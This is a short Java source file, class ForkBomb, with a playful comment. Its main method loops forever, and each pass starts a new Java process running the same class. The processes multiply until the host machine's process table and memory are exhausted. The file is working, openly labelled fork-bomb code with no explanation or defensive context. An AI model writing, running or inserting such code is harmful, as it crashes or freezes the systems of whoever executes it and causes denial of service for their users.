public class ForkBomb //Another infinite loop. Run run run little forkbomb
{
	public static void main(String[] args) throws java.io.IOException {
		while(true) {
			Runtime.getRuntime().exec(new String[]{"java", "-cp", System.getProperty("java.class.path"), "ForkBomb"});

		}
	}
}